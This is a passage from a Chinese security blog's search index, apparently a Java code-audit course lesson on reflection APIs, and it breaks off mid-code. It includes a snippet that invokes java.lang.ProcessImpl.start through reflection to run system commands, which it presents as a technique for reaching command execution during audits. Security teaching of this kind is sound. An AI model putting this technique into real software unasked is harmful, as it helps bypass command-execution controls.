<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JavaWeb代码审计实战之反射机制基础-代码详解版本</title>
    <link href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3%E7%89%88%E6%9C%AC/"/>
    <url>/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源，请勿设置原创】</p><p>嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。</p><p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="公众号"></p><p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p><p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p><p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@Java代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@PHP代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg" alt="炼石计划@渗透攻防宇宙"></p><p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p><h1 id="一、Java反射基础"><a href="#一、Java反射基础" class="headerlink" title="一、Java反射基础"></a>一、Java反射基础</h1><p>其实，在Java命令执行和Java数据库操作章节，我们就已经简单接触到Java反射了。</p><p>一是<code>Java命令执行</code>章节中，使用<code>java.lang.ProcessImpl</code>的话需要配合反射机制来执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>method.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>二是<code>Java数据库操作</code>章节中，使用反射机制来注册Mysql驱动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 注册驱动</span><br>Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br></code></pre></td></tr></table></figure><p>本节我们就学习下Java反射机制的基础知识吧。</p><h2 id="1、什么是反射？"><a href="#1、什么是反射？" class="headerlink" title="1、什么是反射？"></a>1、什么是反射？</h2><p>Java的反射（reflection）机制是指在程序运行中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。 这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制 。</p><p>反射机制允许我们在Java程序运行时检查，操作或者说获取任何类、接口、构造函数、方法和字段。还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等操作。</p><p>在Java代码审计中学习反射机制，我们目的是可以利用反射机制操作目标方法执行系统命令。比如我们想要反射调用<code>java.lang.runtime</code>去执行系统命令。这个下面会讲到。</p><p>下面，通过代码案例来学习反射API，进一步理解反射机制。</p><h2 id="2、创建练习项目工程"><a href="#2、创建练习项目工程" class="headerlink" title="2、创建练习项目工程"></a>2、创建练习项目工程</h2><p>老规矩，先创建一个名为<code>reflectdemo</code>的项目工程，用于下面示例代码的练习。</p><p>①、打开IDEA，点击<code>Create New Project</code>，创建新的工程。</p><p>②、左侧选择Maven，配置默认即可，不选择任何模板，点击Next。</p><p>③、起个项目名称为<code>reflectdemo</code>，其他默认即可，点击Finish。</p><p>④、在Java目录下创建名为<code>com.exampl.demo</code>的包，并在demo包下再创建一个名为<code>entity</code>的包，最终目录结构如下图所示：</p><p><img src="/img/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.jpg" alt="目录结构"></p><h2 id="3、获取Class对象"><a href="#3、获取Class对象" class="headerlink" title="3、获取Class对象"></a>3、获取Class对象</h2><p>获取Class对象的方式有下面几种，：</p><ul><li>根据类名：类名.class</li><li>根据对象：对象.getClass()</li><li>根据全限定类名：Class.forName(全路径类名)</li><li>通过类加载器获得class对象：ClassLoader.getSystemClassLoader().loadClass(“com.example.xxx”);</li></ul><p>举个简单的例子。</p><p>①、我们在<code>com.example.demo.entity</code>下创建个<code>User</code>类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;power7089&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String testStr)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/User%E5%AE%9E%E4%BD%93%E7%B1%BB.jpg" alt="User实体类"></p><p>②、我们再<code>com.example.demo</code>先创建一个名为<code>GetClass</code>的类，用于演示获取User Class对象几种方式，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><span class="hljs-keyword">import</span> com.example.demo.entity.User;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//1.通过类名.class</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> User.class;<br><br>        <span class="hljs-comment">//2.通过对象的getClass()方法</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> user.getClass();<br><br>        <span class="hljs-comment">//3.通过 Class.forName()获得Class对象;</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.demo.entity.User&quot;</span>);<br><br>        <span class="hljs-comment">//4.通过类加载器获得class对象</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> classLoader.loadClass(<span class="hljs-string">&quot;com.example.demo.entity.User&quot;</span>);<br><br>        System.out.println(c1);<br>        System.out.println(c2);<br>        System.out.println(c3);<br>        System.out.println(c4);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/getclass%E7%B1%BB%E4%BB%A3%E7%A0%81.jpg" alt="getclass类代码"></p><p>动手操作调试，观察运行结果，并加以思考。</p><p>那他们几个有什么需要注意的呢？</p><ul><li>类名.class：需要导入类的包。</li><li>对象.getClass()：初始化对象后，其实不需要再使用反射了。</li><li><strong>Class.forName(全路径类名)：需要知道类的完整全路径，这是我们常使用的方法。</strong></li><li>通过类加载器获得class对象：ClassLoader.getSystemClassLoader().loadClass(“com.example.xxx”);</li></ul><p>Class.forName()获取class对象方法是常用的一种方式，下面所有示例代码我们都使用<code>Class.forName()</code>这个方法来获取Class对象。</p><p>在获取到目标Class对象后，我们可以做的事就多了，下面我们通过示例代码进一步演示。</p><h2 id="4、Java反射API"><a href="#4、Java反射API" class="headerlink" title="4、Java反射API"></a>4、Java反射API</h2><p>Java提供了一套反射API，该API由<code>Class</code>类与<code>java.lang.reflect</code>类库组成。</p><p>该类库包含了<code>Field</code>、<code>Method</code>、<code>Constructor</code>等类。</p><p>java.lang.reflect官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/package-summary.html</code></p><p>（这部分的官方文档我都是给的java8的，大家可以将路径中的数字8改为7，9，10等，这几个版本会有不同的地方大家可自行比对学习）</p><hr><p>:warning:在进行下面练习前，首先我们需要在<code>com.example.demo</code>下新建一个名为<code>reflectdemo</code>的包，并新建一个名为<code>UserInfo</code>的Java Class，并键入一下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInfo</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInfo</span><span class="hljs-params">()</span> &#123; &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">UserInfo</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInfo</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">introduce</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我叫&quot;</span> + name + <span class="hljs-string">&quot;，今年&quot;</span> + age + <span class="hljs-string">&quot;岁了！&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello！我叫[&quot;</span> + name + <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/userinfo%E7%B1%BB%E4%BB%A3%E7%A0%81.JPG" alt="userinfo类代码"></p><h3 id="4-1、java-lang-Class"><a href="#4-1、java-lang-Class" class="headerlink" title="4.1、java.lang.Class"></a>4.1、java.lang.Class</h3><p>用来描述类的内部信息，<code>Class</code>的实例可以获取类的包、注解、修饰符、名称、超类、接口等。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html</code>。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getPackage()</td><td>获取该类的包</td></tr><tr><td>getDeclaredAnnotations()</td><td>获取该类上所有注解</td></tr><tr><td>getModifiers()</td><td>获取该类上的修饰符</td></tr><tr><td>getName()</td><td>获取类名称</td></tr><tr><td>getSimpleName()</td><td>获取简单类名称</td></tr><tr><td>getGenericSuperclass()</td><td>获取直属超类</td></tr><tr><td>getGenericInterfaces()</td><td>获取直属实现的接口</td></tr><tr><td>newInstance()</td><td>根据构造函数创建一个实例</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h4 id="4-1-1、示例代码"><a href="#4-1-1、示例代码" class="headerlink" title="4.1.1、示例代码"></a>4.1.1、示例代码</h4><p>①、在创建<code>com.example.demo.reflectdemo</code>下创建一个名为<code>ClassDemo</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 编号7089</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> ClassDemo &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;com.example.demo.reflectdemo.UserInfo&quot;</span>);<br>        <span class="hljs-comment">// 获取该类所在包路径</span><br>        <span class="hljs-keyword">Package</span> aPackage = clazz.getPackage();<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;getPackage运行结果：&quot;</span> + aPackage);<br><br>        <span class="hljs-comment">// 获取类上的修饰符</span><br>        <span class="hljs-keyword">int</span> modifiers = clazz.getModifiers();<br>        String modifier = Modifier.toString(modifiers);<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;getModifiers运行结果：&quot;</span> + modifier);<br><br>        <span class="hljs-comment">// 获取类名称</span><br>        String name = clazz.getName();<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;getName运行结果：&quot;</span> + name);<br>        <span class="hljs-comment">// 获取简单类名</span><br>        String simpleName = clazz.getSimpleName();<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;getSimpleName运行结果：&quot;</span> + simpleName);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/classdemo%E4%BB%A3%E7%A0%81.jpg" alt="classdemo代码"></p><p>运行结果如下图所示：</p><p><img src="/img/classdemo%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg" alt="classdemo运行结果"></p><h3 id="4-2、java-lang-reflect-Field"><a href="#4-2、java-lang-reflect-Field" class="headerlink" title="4.2、java.lang.reflect.Field"></a>4.2、java.lang.reflect.Field</h3><p>提供了类的属性信息。可以获取属性上的注解、修饰符、属性类型、属性名等。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Field.html</code>。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getField(“xxx”)</td><td>获取目标类中声明为 public 的属性</td></tr><tr><td>getFields()</td><td>获取目标类中所有声明为 public 的属性</td></tr><tr><td>getDeclaredField(“xxx”)</td><td>获取目标类中声明的属性</td></tr><tr><td>getDeclaredFields()</td><td>获取目标类中所有声明的属性</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h4 id="4-2-1、示例代码"><a href="#4-2-1、示例代码" class="headerlink" title="4.2.1、示例代码"></a>4.2.1、示例代码</h4><p>①、在创建<code>com.example.demo.reflectdemo</code>下创建一个名为<code>FieldDemo</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FieldDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.example.demo.reflectdemo.UserInfo&quot;</span>);<br><br>        <span class="hljs-comment">// 获取一个该类或父类中声明为 public 的属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field1</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;age&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;getField运行结果：&quot;</span> + field1);<br><br>        <span class="hljs-comment">// 获取该类及父类中所有声明为 public 的属性</span><br>        Field[] fieldArray1 = clazz.getFields();<br>        <span class="hljs-keyword">for</span> (Field field : fieldArray1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;getFields运行结果：&quot;</span> + field);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取一个该类中声明的属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field2</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;getDeclaredField运行结果：&quot;</span> + field2);<br><br>        <span class="hljs-comment">// 获取某个属性的修饰符（该示例为获取上面name属性的修饰符）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">modifier</span> <span class="hljs-operator">=</span> Modifier.toString(field2.getModifiers());<br>        System.out.println(<span class="hljs-string">&quot;getModifiers运行结果： &quot;</span> + modifier);<br><br>        <span class="hljs-comment">// 获取该类中所有声明的属性</span><br>        Field[] fieldArray2 = clazz.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (Field field : fieldArray2) &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDeclaredFields运行结果：&quot;</span> + field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fielddemo%E4%BB%A3%E7%A0%81.jpg" alt="fielddemo代码"></p><p>运行结果如下图所示：</p><p><img src="/img/fielddemo%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg" alt="fielddemo运行结果"></p><h3 id="4-3、java-lang-reflect-Method"><a href="#4-3、java-lang-reflect-Method" class="headerlink" title="4.3、java.lang.reflect.Method"></a>4.3、java.lang.reflect.Method</h3><p>提供了类的方法信息。可以获取方法上的注解、修饰符、返回值类型、方法名称、所有参数。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html</code>。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getMethod(“setAge”, String.class)</td><td>获取目标类及父类中声明为 public 的方法，需要指定方法的入参类型</td></tr><tr><td>getMethods()</td><td>获取该类及父类中所有声明为 public 的方法</td></tr><tr><td>getDeclaredMethod()</td><td>获取一个在该类中声明的方法</td></tr><tr><td>getDeclaredMethods()</td><td>获取所有在该类中声明的方法</td></tr><tr><td>getParameters()</td><td>获取所有传参</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h4 id="4-3-1、示例代码"><a href="#4-3-1、示例代码" class="headerlink" title="4.3.1、示例代码"></a>4.3.1、示例代码</h4><p>①、在创建<code>com.example.demo.reflectdemo</code>下创建一个名为<code>MethodDemo</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Parameter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.example.demo.reflectdemo.UserInfo&quot;</span>);<br><br>        <span class="hljs-comment">// 获取一个该类及父类中声明为 public 的方法，需要指定方法的入参类型</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>        System.out.println(<span class="hljs-string">&quot;01-getMethod运行结果：&quot;</span> + method);<br><br>        <span class="hljs-comment">// 获取所有入参</span><br>        Parameter[] parameters = method.getParameters();<br>        <span class="hljs-keyword">for</span> (Parameter temp : parameters) &#123;<br>            System.out.println(<span class="hljs-string">&quot;getParameters运行结果 &quot;</span> + temp);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取该类及父类中所有声明为 public 的方法</span><br>        Method[] methods = clazz.getMethods();<br>        <span class="hljs-keyword">for</span> (Method temp : methods) &#123;<br>            System.out.println(<span class="hljs-string">&quot;02-getMethods运行结果：&quot;</span> + temp);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取一个在该类中声明的方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">declaredMethod</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;03-getDeclaredMethod运行结果：&quot;</span> + declaredMethod);<br><br>        <span class="hljs-comment">// 获取所有在该类中声明的方法</span><br>        Method[] declaredMethods = clazz.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (Method temp : declaredMethods) &#123;<br>            System.out.println(<span class="hljs-string">&quot;04-getDeclaredMethods运行结果：&quot;</span> + temp);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/methoddemo%E4%BB%A3%E7%A0%81.jpg" alt="methoddemo代码"></p><p>运行结果如下图所示：</p><p><img src="/img/methoddemo%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg" alt="methoddemo运行结果"></p><h3 id="4-4、java-lang-reflect-Modifier"><a href="#4-4、java-lang-reflect-Modifier" class="headerlink" title="4.4、java.lang.reflect.Modifier"></a>4.4、java.lang.reflect.Modifier</h3><p>提供了访问修饰符信息。通过<code>Class</code>、<code>Field</code>、<code>Method</code>、<code>Constructor</code>等对象都可以获取修饰符，这个访问修饰符是一个整数，可以通过<code>Modifier.toString</code>方法来查看修饰符描述。并且该类提供了一些静态方法和常量来解码访问修饰符。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Modifier.html</code></p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getModifiers()</td><td>获取类的修饰符值</td></tr><tr><td>getDeclaredField(“username”).getModifiers()</td><td>获取属性的修饰符值</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h4 id="4-4-1、示例代码"><a href="#4-4-1、示例代码" class="headerlink" title="4.4.1、示例代码"></a>4.4.1、示例代码</h4><p>①、在创建<code>com.example.demo.reflectdemo</code>下创建一个名为<code>ModifierDemo</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 